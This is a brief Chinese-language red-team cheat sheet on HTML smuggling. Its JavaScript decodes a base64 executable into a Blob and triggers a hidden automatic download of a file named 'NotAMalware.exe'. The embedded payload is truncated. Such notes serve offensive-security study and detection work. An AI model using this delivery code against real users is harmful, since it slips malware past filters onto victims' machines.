# HTML走私

## 概述

- [描述](#描述)
- [可执行存储](#可执行存储)

## 描述

HTML走私是指让用户导航到我们精心制作的HTML页面，该页面会自动下载我们的恶意文件。

## 可执行存储

我们可以将有效载荷存储在Blob对象中 => JS: `var blob = new Blob([data], {type: 'octet/stream'});`
为了执行下载，我们需要创建一个对象URL => JS: `var url = window.URL.createObjectURL(blob);`
有了这两个元素，我们可以使用JavaScript创建我们的\<a>标签，该标签将用于下载我们的恶意文件：

```Javascript
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
```

为了存储我们的有效载荷，我们使用base64编码：

```Javascript
function base64ToArrayBuffer(base64) {
	var binary_string = window.atob(base64);
	var len = binary_string.length;
	var bytes = new Uint8Array( len );
	for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
	return bytes.buffer;
}
     		
var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'NotAMalware.exe';
```